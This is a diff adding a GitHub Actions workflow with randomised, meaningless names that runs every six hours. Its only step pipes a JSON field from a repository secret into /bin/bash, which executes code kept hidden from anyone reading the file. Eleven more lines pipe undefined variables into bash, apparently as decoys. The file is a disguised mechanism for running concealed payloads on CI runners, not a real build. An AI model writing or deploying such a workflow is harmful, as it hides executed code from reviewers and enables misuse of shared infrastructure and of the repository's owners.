@@ -1,0 +1,29 @@
+name: heavyheadach
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: heavyheadach
+        env:
+          vjlbn2246: ${{ secrets.vjlbn2246 }}
+        run: |
+          echo $vjlbn2246 | jq -r .qjkjl41 | /bin/bash
+          echo $gpq43 | jq -r .smwp404 | /bin/bash
+          echo $jjkr52 | jq -r .so91 | /bin/bash
+          echo $a3 | jq -r .i864 | /bin/bash
+          echo $wi71 | jq -r .l6 | /bin/bash
+          echo $eldxx77983 | jq -r .qhbxy6 | /bin/bash
+          echo $ir97 | jq -r .mq67454 | /bin/bash
+          echo $x91811 | jq -r .di81 | /bin/bash
+          echo $hn4435 | jq -r .x626 | /bin/bash
+          echo $ni637 | jq -r .n29736 | /bin/bash
+          echo $hh96838 | jq -r .kni099 | /bin/bash
+          echo $nyi2154 | jq -r .xzb9767 | /bin/bash
+
